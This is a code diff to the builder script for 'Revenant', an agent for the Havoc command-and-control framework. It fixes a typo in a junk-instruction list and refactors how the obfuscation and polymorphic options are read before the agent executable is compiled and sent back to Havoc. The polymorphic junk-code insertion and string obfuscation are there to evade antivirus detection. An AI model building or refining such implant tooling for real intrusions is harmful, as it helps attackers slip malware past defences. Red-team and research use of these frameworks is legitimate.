@@ -38,7 +38,7 @@ instructions_x86 = [
     "inc eax",
     "dec eax",
     "xor eax, eax",
-    "xor ecx, ecxx",
+    "xor ecx, ecx",
     "cmp eax, eax",
     "test eax, eax",
     ''"xor eax,eax" \
@@ -360,7 +360,7 @@ class Revenant(AgentType):
         print(f"[*] Building Revenant Agent {self.Version}")
         # print(f"config: {config}")
 
-        self.builder_send_message(config['ClientID'], "Info", f"hello from service builder")
+        self.builder_send_message(config['ClientID'], "Info", f"Hello - From Service Builder")
         self.builder_send_message(config['ClientID'], "Info", f"Options Config: {config['Options']}")
         self.builder_send_message(config['ClientID'], "Info", f"Agent Config: {config['Config']}")
 
@@ -370,15 +370,15 @@ class Revenant(AgentType):
         print("[*] Configuring Config.h header...")
         process_config_h(config)
 
-        if self.BuildingConfig["Obfuscation"]:
+        if config['Config']['Obfuscation']:
             process_strings_h()
             print("[*] Configuring String.h header...")
 
         if config['Options']['Arch'] == "64":
 
-            if self.BuildingConfig["Polymorphic"] is True:
+            if config['Config']['Polymorphic']:
                 process_directory(directory_path, instructions_x64, False)
-                print("[*] Configuring source files...")
+                print("[*] Configuring source files x64...")
 
             compile_command: str = "cmake -DARCH=x64 . && cmake --build . -j 1"
 
@@ -390,7 +390,7 @@ class Revenant(AgentType):
                                          stderr=subprocess.PIPE,
                                          universal_newlines=True)
 
-                if self.BuildingConfig["Polymorphic"] is True:
+                if config['Config']['Polymorphic']:
                     process_directory(directory_path, instructions_x64, True)
                     print("[*] Cleaning up source files...")
 
@@ -398,7 +398,7 @@ class Revenant(AgentType):
             except subprocess.CalledProcessError as error:
                 print(f"Error occurred: {error.stderr}")
 
-                if self.BuildingConfig["Polymorphic"]:
+                if config['Config']['Polymorphic']:
                     process_directory(directory_path, instructions_x64, True)
                     print("[*] Cleaning up source files...")
 
@@ -408,9 +408,9 @@ class Revenant(AgentType):
         elif config['Options']['Arch'] == "86":
             compile_command: str = "cmake -DARCH=x86 . && cmake --build . -j 1"
 
-            if self.BuildingConfig["Polymorphic"] is True:
+            if config['Config']['Polymorphic']:
                 process_directory(directory_path, instructions_x86, False)
-                print("[*] Configuring source files...")
+                print("[*] Configuring source files x86...")
 
             try:
                 process = subprocess.run(compile_command,
@@ -420,7 +420,7 @@ class Revenant(AgentType):
                                          stderr=subprocess.PIPE,
                                          universal_newlines=True)
 
-                if self.BuildingConfig["Polymorphic"] is True:
+                if config['Config']['Polymorphic']:
                     process_directory(directory_path, instructions_x86, True)
                     print("[*] Cleaning up source files...")
 
@@ -428,13 +428,14 @@ class Revenant(AgentType):
             except subprocess.CalledProcessError as error:
                 print(f"Error occurred: {error.stderr}")
 
-                if self.BuildingConfig["Polymorphic"]:
+                if config['Config']['Polymorphic']:
                     process_directory(directory_path, instructions_x86, True)
                     print("[*] Cleaning up source files...")
 
                 return
 
             data = open("Agent/Bin/x86/Revenant.exe", "rb").read()
+
         # Below line sends the build executable back to Havoc for file management - 0xtriboulet
         self.builder_send_payload(config['ClientID'], self.Name + "." + self.Formats[0]["Extension"], data)
 
